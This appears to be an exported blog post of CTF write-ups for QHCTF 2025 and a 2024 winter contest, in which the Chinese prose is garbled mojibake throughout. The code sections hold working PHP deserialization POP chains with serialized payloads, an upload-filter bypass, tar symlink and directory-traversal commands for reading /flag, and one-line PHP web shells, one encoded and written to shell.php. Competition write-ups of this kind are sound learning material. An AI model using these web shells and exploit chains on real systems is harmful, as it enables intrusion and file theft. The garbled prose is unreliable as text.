ï¼š\nä½†æ˜¯æ²¡çœ‹å‡ºæ¥è€ƒç‚¹ï¼Œæƒ³äº†ä¸€åœˆï¼Œæœ€è¿‘è€ƒå¾—æ¯”è¾ƒå¤šçš„phpçš„æ¨¡æ¿æ³¨å…¥ï¼Œå°è¯•ä¸€ä¸‹ï¼š\nç›´æ¥æ‰“è¿™é‡Œçš„smartyæ¨¡æ¿ï¼š\nç„¶åè¯»å–flagå³å¯:\nflagå¦‚ä¸‹ï¼š\n1 QHCTF{13535b93-f69f-4bd3-9ee3-c7d495d7e626} Web_pop é“¾å­è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œç›´æ¥çœ‹é€»è¾‘å§ï¼Œå¦‚ä¸‹ç”Ÿæˆå³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class Start{ public $name; protected $func; public function __construct($a){ $this-\u0026gt;func=$a; } public function __destruct() { echo \u0026#34;Welcome to QHCTF 2025, \u0026#34;.$this-\u0026gt;name; } public function __isset($var) { ($this-\u0026gt;func)(); } } class Sec{ private $obj; private $var; public function __construct($a,$b){ $this-\u0026gt;obj=$a; $this-\u0026gt;var=$b; } public function __toString() { $this-\u0026gt;obj-\u0026gt;check($this-\u0026gt;var); return \u0026#34;CTFers\u0026#34;; } public function __invoke() { echo file_get_contents(\u0026#39;/flag\u0026#39;); } } class Easy{ public $cla; public function __call($fun, $var) { $this-\u0026gt;cla = clone $var[0]; } } class eeee{ public $obj; public function __clone() { if(isset($this-\u0026gt;obj-\u0026gt;cmd)){ echo \u0026#34;success\u0026#34;; } } } $m=new Sec(1,2); $d=new Start($m); $z=new eeee(); $z-\u0026gt;obj=$d; $c=new Easy(); $d=$z; $a=new Start(11); $a-\u0026gt;name=new Sec($c,$d); echo urlencode(serialize($a)); æœ€åçš„è§¦å‘ç‚¹æ˜¯file_get_contents()å‡½æ•°ï¼Œé“¾å­ä¹Ÿæ¯”è¾ƒç®€å•ã€‚é‡Œé¢å°±æ¶‰åŠåˆ°äº†ä¸€ä¸ªä¸å¸¸ç”¨çš„__cloneé­”æœ¯æ–¹æ³•ï¼Œåªè¦å°†\n1 2 3 4 public function __call($fun, $var) { $this-\u0026gt;cla = clone $var[0]; } é‡Œçš„$var[0]è®¾ç½®ä¸º__cloneé­”æœ¯æ–¹æ³•æ‰€åœ¨ç±»å³å¯ã€‚\nå°†ç”Ÿæˆçš„payloadå‘é€å³å¯ï¼š\n1 O%3A5%3A%22Start%22%3A2%3A%7Bs%3A4%3A%22name%22%3BO%3A3%3A%22Sec%22%3A2%3A%7Bs%3A8%3A%22%00Sec%00obj%22%3BO%3A4%3A%22Easy%22%3A1%3A%7Bs%3A3%3A%22cla%22%3BN%3B%7Ds%3A8%3A%22%00Sec%00var%22%3BO%3A4%3A%22eeee%22%3A1%3A%7Bs%3A3%3A%22obj%22%3BO%3A5%3A%22Start%22%3A2%3A%7Bs%3A4%3A%22name%22%3BN%3Bs%3A7%3A%22%00%2A%00func%22%3BO%3A3%3A%22Sec%22%3A2%3A%7Bs%3A8%3A%22%00Sec%00obj%22%3Bi%3A1%3Bs%3A8%3A%22%00Sec%00var%22%3Bi%3A2%3B%7D%7D%7D%7Ds%3A7%3A%22%00%2A%00func%22%3Bi%3A11%3B%7D æœ€åå¾—åˆ°flagï¼š\nå¦‚ä¸‹ï¼š\n1 QHCTF{d0c53a2b-dfcf-4615-aaed-258e4da58db7} PCREMagic å¼€é¢˜å°±æ˜¯phpä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php function is_php($data){ return preg_match(\u0026#39;/\u0026lt;\\?php.*?eval.*?\\(.*?\\).*?\\?\u0026gt;/is\u0026#39;, $data); } if(empty($_FILES)) { die(show_source(__FILE__)); } $user_dir = \u0026#39;data/\u0026#39; . md5($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); $data = file_get_contents($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); if (is_php($data)) { echo \u0026#34;bad request\u0026#34;; } else { if (!is_dir($user_dir)) { mkdir($user_dir, 0755, true); } $path = $user_dir . \u0026#39;/\u0026#39; . random_int(0, 10) . \u0026#39;.php\u0026#39;; move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], $path); header(\u0026#34;Location: $path\u0026#34;, true, 303); exit; } ?\u0026gt; å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„å¤„ç†é€»è¾‘ï¼Œè¿˜æ˜¯è¿‡æ»¤äº†å¦‚ä¸‹æ ¼å¼ï¼š\n1 \u0026lt;?php ... eval(...) ?\u0026gt; å†™ä¸€ä¸ªå‰ç«¯ä¸Šä¼ æ–‡ä»¶çš„é¡µé¢ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;File Upload\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f9; } .upload-container { background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); text-align: center; width: 300px; } .upload-container input[type=\u0026#34;file\u0026#34;] { margin-bottom: 15px; } .upload-container button { background-color: #4CAF50; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 5px; font-size: 16px; } .upload-container button:hover { background-color: #45a049; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;upload-container\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Upload File\u0026lt;/h2\u0026gt; \u0026lt;form action=\u0026#34;http://challenge.qihangcup.cn:33188/\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;Select a file to upload:\u0026lt;/label\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34; required\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Upload\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æ–‡ä»¶ä¸Šä¼ åªå¯¹æ–‡ä»¶å†…å®¹æœ‰æ£€æµ‹ï¼Œå…¶ä»–ä¸ç”¨ç®¡ã€‚\næœ€å¼€å§‹å°è¯•å¦‚ä¸‹ï¼š\n1 \u0026lt;?php system($_POST[123]); ?\u0026gt; å‘ç°ä¸æ‰§è¡Œï¼Œç„¶åçœ‹äº†ä¸€ä¸‹phpinfo()ï¼š\n1 \u0026lt;?php phpinfo(); ?\u0026gt; æœ‰disable_functionï¼Œä½†æ˜¯ç»•ä¸€ä¸‹ç”¨èšå‰‘è¿å³å¯ï¼š\n1 \u0026lt;?=eval($_POST[123]); ?\u0026gt; å³ï¼š\nç„¶ååœ¨æ ¹ç›®å½•ç¿»åˆ°flagï¼š\nflagå¦‚ä¸‹ï¼š\n1 QHCTF{87dbcc83-57e7-4604-a8d3-17a5fb8be5bb} misc QHCTF For Year 2025 æå‰ç¥å¤§å®¶æ–°å¹´å¿«ä¹ï¼ æäº¤æ–¹å¼ï¼šQHCTF{xxxxxxx}\nâ€”â€”â€”â€”â€”â€”â€”â€”\nåŸé¢˜ï¼Œå‚è€ƒ 2017_Dating_in_Singaporeã€‚è¿™é‡Œæ¯ä¸€æ ¼ä»£è¡¨ä¸€ä¸ªæœˆä»½ï¼Œåˆ†å¼€å°±è¡Œï¼Œæ¯ä¸¤ä¸ªæ•°å­—ä»£è¡¨å…¶ä¸­ä¸€ä¸ªæ—¥æœŸï¼Œåœ¨æ—¥å†è¡¨ä¸­ç”»å³å¯ï¼š\nå¾—åˆ°flagï¼š\n1 QHCTF{FUN} â€”â€”â€”â€”â€”â€”\nPvzHE å°æ˜å­¦ä¹ äº†å‡ å¤©åå·²èº«å¿ƒä¿±ç–²ï¼Œäºæ˜¯ä»–å†³å®šç©ä¸ªæ¸¸æˆæ”¾æ¾ä¸‹ï¼Œè¯·ä½ æ‰¾å‡ºå…¶ä¸­çš„flagå€¼\nâ€”â€”â€”â€”â€”â€”â€”â€”\nä¸‹è½½é™„ä»¶åå‘ç°å°±æ˜¯æ¤ç‰©å¤§æˆ˜åƒµå°¸ï¼Œä½†æ˜¯æ˜¯ç»™äº†é™„ä»¶é‚£äº›ï¼Œç¿»äº†ä¸€ä¸‹æ–‡ä»¶å¤¹ï¼Œåœ¨imagesæ–‡ä»¶å¤¹çš„ä¸€å¼ å›¾ç‰‡çœ‹åˆ°äº†flagï¼š\næå–å‡ºæ¥ç›´æ¥äº¤å°±è¡Œï¼š\n1 QHCTF{300cef31-68d9-4b72-b49d-a7802da481a5} â€”â€”â€”â€”â€”â€”\nä½ èƒ½çœ‹æ‡‚è¿™ä¸²æœªçŸ¥çš„æ–‡å­—å— è§£å‡ºåè‹¥æ˜¯å¤§å†™ï¼Œè¯·å°†flagçš„å†…å®¹è½¬æ¢æˆå°å†™è¿›è¡Œæäº¤ æäº¤æ–¹å¼ï¼šQHCTF{xxxxxxxxx}\nâ€”â€”â€”â€”â€”â€”\né™„ä»¶ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼š\nç™¾åº¦è¯†å›¾ï¼ŒçŸ¥é“æ˜¯ç¾Šæ–‡:\nå¯¹æ¯”ç€è¿›è¡Œæ‹¼è¯»å³å¯ï¼š\n1 2 3 szfpguw izgwesq zoaoerv ç„¶åå°è¯•äº†å¦‚ä¸‹å‡ ç§ï¼š\n1 2 3 4 QHCTF{szfpguwizgwesqzoaoerv} QHCTF{szfpguw-izgwesq-zoaoerv} QHCTF{szfpguwizgwesqzoaoerv!!!} QHCTF{szfpguw-izgwesq-zoaoerv!!!} éƒ½æ²¡æœ‰æˆåŠŸï¼ˆåŸå›¾æœ€åæ˜¯æœ‰ä¸‰ä¸ª!çš„ï¼‰ã€‚\nçŒœæµ‹æ˜¯éœ€è¦åç§»å•¥çš„ï¼Œä½†æ˜¯ä¸€ç›´æ²¡æ‰¾å¯¹keyã€‚\nç°åœ¨å°±åªæœ‰ä»å›¾ç‰‡ä¸‹æ‰‹äº†ï¼Œæ‹–è¿›éšæ³¢é€æµï¼Œåœ¨LSBä¸­çœ‹åˆ°ä¸€ä¸ªéå¸¸åƒä¿¡æ¯çš„ä¸œè¥¿ï¼š\nçŒœæµ‹è¿™ä¸ªä¸œè¥¿å°±æ˜¯keyï¼š\n1 qihangbeiiseasy ç„¶åç»´å‰å°¼äºšè§£å¯†å³å¯ï¼š\nè¿™ä¸ªå°±å¾ˆåƒäº†ï¼Œæœ€åæµ‹è¯•flagå¦‚ä¸‹ï¼š\n1 QHCTF{cryptoveryeasybysheep!!!} â€”â€”â€”â€”â€”â€”â€”â€”\n","date":"2025-01-28T00:17:39+08:00","permalink":"https://fupanc-w1n.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%90%AF%E8%88%AA%E6%9D%AFwebmisc-wp/","title":"ç¬¬ä¸€å±Šå¯èˆªæ¯web\u0026misc wp"},{"content":"writeup web easy_flaskã€day1ã€‘ æƒ³æƒ³flaskï¼ï¼\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nå¼€é¢˜ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œéšä¾¿è¾“å…¥å¦‚ä¸‹å›æ˜¾ï¼š ä¸€çœ¼sstiï¼Œç›´æ¥ç”¨hackbarä¸­çš„payloadæ‰“å³å¯ï¼š\nå¾—åˆ°flagã€‚\nfile_copyã€day1ã€‘ file copy\nâ€”â€”â€”â€”â€”â€”\nå¼€é¢˜å¦‚ä¸‹ï¼š éšä¾¿è¾“å…¥/etc/passwdè¿”å›å€¼å¦‚ä¸‹ï¼š\nç„¶åå°è¯•äº†ä¸€ä¸‹/flagï¼š\næœ‰å†…å®¹ã€‚ç„¶åæƒ³äº†ä¸€ä¸‹åç«¯çš„é€»è¾‘ï¼ŒçŒœæµ‹è¿™é‡Œæ˜¯è°ƒç”¨çš„copy()å‡½æ•°ï¼Œç„¶åéšä¾¿è¾“å…¥ï¼Œå¾—åˆ°å¦‚ä¸‹æŠ¥é”™ç»“æœï¼š\ncopy()å‡½æ•°æ˜¯ä¸€ä¸ªæ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œå¯ä»¥æ‰“oracleä¾§ä¿¡é“ï¼Œç›´æ¥è·‘è„šæœ¬å³å¯ï¼š\nå¾—åˆ°flagã€‚\nGotarã€day1ã€‘ ä¸€ä¸ªç®€é™‹çš„æ–‡ä»¶ç®¡ç†ç³»ç»Ÿï¼Œä½ èƒ½æ‹¿åˆ°adminç”¨æˆ·ä¸Šä¼ çš„flagå—ï¼Ÿ\nâ€”â€”â€”â€”â€”â€”â€”â€”\nçœ‹äº†ä¸€ä¸‹å®˜æ–¹wpï¼Œè¿™ä¸ªç®—æ˜¯éé¢„æœŸçš„æ–¹æ³•ã€‚\né¢˜ç›®ç»™äº†goæºç ã€‚è‡ªå·±å®¡æºç ï¼Œæ²¡å®¡å‡ºæ¥ä»€ä¹ˆä¸œè¥¿ï¼Œå°è¯•è¿‡ç›´æ¥ä¼ªé€ jwtï¼Œä½†æ˜¯æ²¡æˆåŠŸã€‚ç„¶åæœæ–‡ç« ï¼Œçœ‹åˆ°äº†å¦‚ä¸‹æ–‡ç« ï¼š\nhttps://xz.aliyun.com/t/15049?time__1311=GqjxuiPYqDq0yqeqBKumxRxWqT5xn0geoD#toc-10\né‡Œé¢æåˆ°äº†å‡ ä¸ªgoè¯­è¨€çš„å­˜åœ¨æ¼æ´çš„å‡½æ•°ï¼Œæ¯”å¦‚æœ‰ç›®å½•ç©¿è¶Šæ¼æ´ã€‚\nä½†æ˜¯æˆ‘æ‰¾äº†ä¸€åœˆæ²¡çœ‹åˆ°åˆ©ç”¨ç‚¹ã€‚æ„Ÿè§‰æ˜¯åœ¨æ–‡ä»¶ä¸Šä¼ è¿™ä¸ªåœ°æ–¹æœ‰åˆ©ç”¨ç‚¹ï¼Œè¿™é‡Œåç«¯é‡‡ç”¨çš„archive/taråº“åªèƒ½è§£ætaråç¼€çš„å‹ç¼©æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±åªèƒ½ä¸Šä¼ taræ–‡ä»¶ã€‚æƒ³åˆ°äº†è½¯é“¾æ¥ï¼Œå‰é¢éƒ½æ˜¯æ‰“çš„unzipè½¯é“¾æ¥ï¼Œè¿™é‡Œåº”è¯¥ä¹Ÿå­˜åœ¨tarè½¯é“¾æ¥ï¼Œæƒ³ç€ä½¿ç”¨tarè½¯é“¾æ¥æ¥å¸¦å‡ºæ–‡ä»¶ã€‚æ‰¾åˆ°äº†ä¸€ç¯‡æ„Ÿè§‰å¯ä»¥æ‰“çš„æ–‡ç« ï¼š\nhttps://b1ue0ceanrun.github.io/2022/07/08/justctf2022/\nä½†æ˜¯åœ¨æœ€å…³é”®çš„å¦‚ä½•å‹ç¼©taræ–‡ä»¶æ²¡æœ‰å…·ä½“è¯´æ˜ï¼ŒåŸæ–‡æ„Ÿè§‰æ˜¯ç›´æ¥åˆ©ç”¨çš„winraræ¥å‹ç¼©çš„ï¼Œè¿™é‡Œæ²¡æœ‰æˆåŠŸï¼Œä¸€ç›´æ²¡æ‰“å‡ºæ¥ï¼Œæ„Ÿè§‰å°±æ˜¯å‘½ä»¤å‡ºäº†é—®é¢˜ã€‚\nåé¢å°±å¯ä»¥æœtarè½¯é“¾æ¥ï¼Œå¦‚ä¸‹æ–‡ç« ï¼š\nhttps://www.ek1ng.com/2023CrewCTFWP.html#archive-stat-viewer\nè¿™ä¸ªæ–‡ç« å°±å¾ˆåƒäº†ã€‚\nå¯ä»¥çŸ¥é“åŸºæœ¬æ€è·¯ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸€ç›´æ²¡æ‰“å‡ºæ¥ï¼Œæ‰¾äº†ä¸€ç¯‡æ–‡ç« è¯´æ€ä¹ˆå†™è½¯é“¾æ¥ï¼Œå…¶ä½¿ç”¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š\n1 tar -cvhf ./tmp/SK_Aug_camera.tar ./gap_40_5 è¿™ä¸ªå…¶å®æœ‰ä¸€å®šçš„é—®é¢˜ï¼Œå¯¹äºtarå‘½ä»¤çš„å‚æ•°è¯´æ˜çš„å‚è€ƒæ–‡ç« å¦‚ä¸‹ï¼š\nhttps://blog.csdn.net/u013053075/article/details/103117341\né‡Œé¢è¯´åˆ°äº†-hé€‰é¡¹çš„ï¼š\nä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå‹ç¼©æˆtaråŒ…æ—¶ä¼šå°†æˆ‘ä½¿ç”¨ln -så‘½ä»¤æŒ‡å®šçš„è½¯é“¾æ¥çš„æ–‡ä»¶ä¸­çš„å†…å®¹ç›´æ¥å‹ç¼©åœ¨é‡Œé¢ï¼Œè€Œä¸æ˜¯å°†è½¯é“¾æ¥çš„æŒ‡å‘å‹ç¼©åœ¨é‡Œé¢ï¼Œä½†æ˜¯æˆ‘ä»¬çœŸæ­£æƒ³è¦åˆ©ç”¨çš„æ˜¯ç¬¬äºŒä¸ªï¼Œæ‰€ä»¥è¿™é‡Œå¹¶ä¸èƒ½åŠ ä¸Š-hé€‰é¡¹ï¼Œæ‰€ä»¥æœ€åå°è¯•çš„å‘½ä»¤å¦‚ä¸‹ï¼š\n1 tar -cvf 1234.tar passwd å¦‚ä¸‹æ‰§è¡Œå³å¯ï¼š\nç„¶åä¸Šä¼ 1234.taræ–‡ä»¶ï¼Œå¦‚ä¸‹å›æ˜¾ï¼š è¯´æ˜¯å·²ç»æœ‰äº†è½¯é“¾æ¥ï¼Œé‚£ä¹ˆç°åœ¨è®¿é—®ä¸€ä¸‹ç»™çš„è·¯å¾„ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œä½†æ˜¯è¿™é‡Œçš„2æ˜¯ä¸€ä¸ªç›®å½•ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä¸€ä¸‹ç›®å½•ç©¿è¶Šï¼š\n1 tar -cvf 1234.tar ../../passwd è¿˜æ˜¯æ²¡æ‰“å‡ºæ¥ï¼Œåæ¥å‘ç°æ˜¯tarç‰ˆæœ¬çš„é—®é¢˜ï¼Œå‹ç¼©æ—¶ä¼šè‡ªåŠ¨å»é™¤../ï¼Œåé¢å¤šæ³¨æ„ä¸€ä¸‹ã€‚\næ¯”èµ›ç»“æŸæ‰¾æ™¨æ›¦å¸ˆå‚…è¦äº†ä¸€ä¸‹wpã€‚æœ€åæ²¡å¤ç°å‡ºæ¥ï¼Œç¯å¢ƒå…³äº†ã€‚\néé¢„æœŸæ˜¯æ‰“çš„tarè½¯é“¾æ¥ï¼Œéœ€è¦ç›®å½•ç©¿è¶Šä¸€ä¸‹ï¼Œè¿™é‡Œä½¿ç”¨çš„tarç›®å½•çš„é€‰é¡¹ä¸ºï¼š\n1 2 ln -s /flag flag tar cf a3.tar ../../flag å®˜ç½‘wpæ˜¯å¯ä»¥ç›®å½•ç©¿è¶Šå†™æ–‡ä»¶ï¼Œç„¶åè¦†ç›–æ‰.envæ–‡ä»¶é‡Œé¢çš„JWT_SECRETï¼Œè¿™æ ·å¯ä»¥å®ç°adminç”¨æˆ·ä¼ªé€ ï¼Œå¯ä»¥ç›´æ¥åœ¨downloadé¡µé¢è¯»å–åˆ°flagã€‚\nè´´ä¸€ä¸ªå®˜æ–¹wpï¼š\nã€Š2024æ˜¥ç§‹æ¯å†¬å­£èµ›ç¬¬ä¸€å¤©é¢˜ç›®éƒ¨åˆ†è§£æã€‹\neasy_serã€day2ã€‘ ç®€å•çš„ååºåˆ—åŒ–æ¥å“©\nâ€”â€”â€”â€”â€”â€”â€”â€”\nä¸€é“phpååºåˆ—åŒ–çš„é¢˜ï¼Œä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 å¬è¯´popæŒºå¥½ç©çš„ \u0026lt;?php //error_reporting(0); function PassWAF1($data){ $BlackList = array(\u0026#34;eval\u0026#34;, \u0026#34;system\u0026#34;, \u0026#34;popen\u0026#34;, \u0026#34;exec\u0026#34;, \u0026#34;assert\u0026#34;, \u0026#34;phpinfo\u0026#34;, \u0026#34;shell_exec\u0026#34;, \u0026#34;pcntl_exec\u0026#34;, \u0026#34;passthru\u0026#34;, \u0026#34;popen\u0026#34;, \u0026#34;putenv\u0026#34;); foreach ($BlackList as $value) { if (preg_match(\u0026#34;/\u0026#34; . $value . \u0026#34;/im\u0026#34;, $data)) { return true; } } return false; } function PassWAF2($str){ $output = \u0026#39;\u0026#39;; $count = 0; foreach (str_split($str, 16) as $v) { $hex_string = implode(\u0026#39; \u0026#39;, str_split(bin2hex($v), 4)); $ascii_string = \u0026#39;\u0026#39;; foreach (str_split($v) as $c) { $ascii_string .= (($c \u0026lt; \u0026#39; \u0026#39; || $c \u0026gt; \u0026#39;~\u0026#39;) ? \u0026#39;.\u0026#39; : $c); } $output .= sprintf(\u0026#34;%08x: %-40s %-16s\\n\u0026#34;, $count, $hex_string, $ascii_string); $count += 16; } return $output; } function PassWAF3($data){ $BlackList = array(\u0026#34;\\.\\.\u0026#34;, \u0026#34;\\/\u0026#34;); foreach ($BlackList as $value) { if (preg_match(\u0026#34;/\u0026#34; . $value . \u0026#34;/im\u0026#34;, $data)) { return true; } } return false; } function Base64Decode($s){ $decodeStr = base64_decode($s); if (is_bool($decodeStr)) { echo \u0026#34;gg\u0026#34;; exit(-1); } return $decodeStr; } class STU{ public $stu; public function __construct($stu){ $this-\u0026gt;stu = $stu; } public function __invoke(){ echo $this-\u0026gt;stu; } } class SDU{ public $Dazhuan; public function __wakeup(){ $Dazhuan = $this-\u0026gt;Dazhuan; $Dazhuan(); } } class CTF{ public $hackman; public $filename; public function __toString(){ $data = Base64Decode($this-\u0026gt;hackman); $filename = $this-\u0026gt;filename; if (PassWAF1($data)) { echo \u0026#34;so dirty\u0026#34;; return; } if (PassWAF3($filename)) { echo \u0026#34;just so so?\u0026#34;; return; } file_put_contents($filename, PassWAF2($data)); echo \u0026#34;hack?\u0026#34;; return \u0026#34;really!\u0026#34;; } public function __destruct(){ echo \u0026#34;bye\u0026#34;; } } $give = $_POST[\u0026#39;data\u0026#39;]; if (isset($_POST[\u0026#39;data\u0026#39;])) { unserialize($give); } else { echo \u0026#34;\u0026lt;center\u0026gt;å¬è¯´popæŒºå¥½ç©çš„\u0026lt;/center\u0026gt;\u0026#34;; highlight_file(__FILE__); } å…¶ä¸­å‡ ä¸ªç‚¹ï¼š\n1 file_put_contents($filename, PassWAF2($data)); å¯ä»¥çŸ¥é“æ˜¯å†™æ–‡ä»¶ï¼Œè¿™é‡Œå°±å¯ä»¥å†™é©¬ã€‚\nå†™é©¬çš„è¯å°±éœ€è¦æ³¨æ„å®šä¹‰çš„å‡½æ•°ä»¥åŠè°ƒç”¨ï¼Œæ¯”è¾ƒéœ€è¦å…³æ³¨çš„å°±å¦‚ä¸‹å‡½æ•°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 function PassWAF2($str){ $output = \u0026#39;\u0026#39;; $count = 0; foreach (str_split($str, 16) as $v) { $hex_string = implode(\u0026#39; \u0026#39;, str_split(bin2hex($v), 4)); $ascii_string = \u0026#39;\u0026#39;; foreach (str_split($v) as $c) { $ascii_string .= (($c \u0026lt; \u0026#39; \u0026#39; || $c \u0026gt; \u0026#39;~\u0026#39;) ? \u0026#39;.\u0026#39; : $c); } $output .= sprintf(\u0026#34;%08x: %-40s %-16s\\n\u0026#34;, $count, $hex_string, $ascii_string); $count += 16; } return $output; } è¿™é‡Œä¼šå°†æˆ‘è¾“å…¥çš„å†…å®¹ç¼–å†™æˆä¸€ä¸ªç±»ä¼¼16è¿›åˆ¶æ ¼å¼çš„é‚£ç§å†…å®¹ï¼Œç„¶åæ‰ä¼šå†™å…¥æ–‡ä»¶ï¼Œå¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php function PassWAF2($str){ $output = \u0026#39;\u0026#39;; $count = 0; foreach (str_split($str, 16) as $v) { $hex_string = implode(\u0026#39; \u0026#39;, str_split(bin2hex($v), 4)); $ascii_string = \u0026#39;\u0026#39;; foreach (str_split($v) as $c) { $ascii_string .= (($c \u0026lt; \u0026#39; \u0026#39; || $c \u0026gt; \u0026#39;~\u0026#39;) ? \u0026#39;.\u0026#39; : $c); } $output .= sprintf(\u0026#34;%08x: %-40s %-16s\\n\u0026#34;, $count, $hex_string, $ascii_string); $count += 16; } return $output; } $a=\u0026#34;\\\u0026lt;\\?php \\$_GET[0](\\$_POST[1])\\?\\\u0026gt;\u0026#34;; $filename = \u0026#34;123456.php\u0026#34;; file_put_contents($filename, PassWAF2($a)); è¿è¡Œå123456.phpæ–‡ä»¶å†…å®¹ä¸ºï¼š\n1 2 00000000: 5c3c 5c3f 7068 7020 245f 4745 545b 305d \\\u0026lt;\\?php $_GET[0] 00000010: 2824 5f50 4f53 545b 315d 295c 3f5c 3e ($_POST[1])\\?\\\u0026gt; å¯ä»¥çœ‹åˆ°æ˜¯å°†ä»£ç åˆ†å‰²å¼€äº†ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œç¼©çŸ­payloadé•¿åº¦ï¼Œè®©å…¶åœ¨ç¬¬ä¸€è¡Œå°±ä¼šè¢«å…¨éƒ¨è§£æï¼Œæƒ³åˆ°äº†ä¸€å¥è¯æœ¨é©¬æœ€çŸ­ç‰ˆï¼š\n1 \u0026lt;?=`$_GET[0]`;?\u0026gt; ç»æµ‹è¯•ï¼Œå¯ä»¥æˆåŠŸï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php function PassWAF2($str){ $output = \u0026#39;\u0026#39;; $count = 0; foreach (str_split($str, 16) as $v) { $hex_string = implode(\u0026#39; \u0026#39;, str_split(bin2hex($v), 4)); $ascii_string = \u0026#39;\u0026#39;; foreach (str_split($v) as $c) { $ascii_string .= (($c \u0026lt; \u0026#39; \u0026#39; || $c \u0026gt; \u0026#39;~\u0026#39;) ? \u0026#39;.\u0026#39; : $c); } $output .= sprintf(\u0026#34;%08x: %-40s %-16s\\n\u0026#34;, $count, $hex_string, $ascii_string); $count += 16; } return $output; } $a=\u0026#39;\u0026lt;?=`$_GET[0]`;?\u0026gt;\u0026#39;; $filename = \u0026#34;123456.php\u0026#34;; file_put_contents($filename, PassWAF2($a)); æ‰€ä»¥ç°åœ¨ç›´æ¥å†™é“¾å­å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 å¬è¯´popæŒºå¥½ç©çš„ \u0026lt;?php class STU{ public $stu; public function __invoke(){ echo $this-\u0026gt;stu; } } class SDU{ public $Dazhuan; public function __wakeup(){ $Dazhuan = $this-\u0026gt;Dazhuan; $Dazhuan(); } } class CTF{ public $hackman; public $filename; public function __toString(){ $data = Base64Decode($this-\u0026gt;hackman); $filename = $this-\u0026gt;filename; if (PassWAF1($data)) { echo \u0026#34;so dirty\u0026#34;; return; } if (PassWAF3($filename)) { echo \u0026#34;just so so?\u0026#34;; return; } file_put_contents($filename, PassWAF2($data)); echo \u0026#34;hack?\u0026#34;; return \u0026#34;really!\u0026#34;; } public function __destruct(){ echo \u0026#34;bye\u0026#34;; } } $a= new SDU(); $a-\u0026gt;Dazhuan=new STU(); $a-\u0026gt;Dazhuan-\u0026gt;stu=new CTF(); $a-\u0026gt;Dazhuan-\u0026gt;stu-\u0026gt;filename=\u0026#34;shell.php\u0026#34;; $a-\u0026gt;Dazhuan-\u0026gt;stu-\u0026gt;hackman=\u0026#39;PD89YCRfR0VUWzBdYDs/Pg==\u0026#39;; echo serialize($a); å¾—åˆ°é“¾å­ï¼š\n1 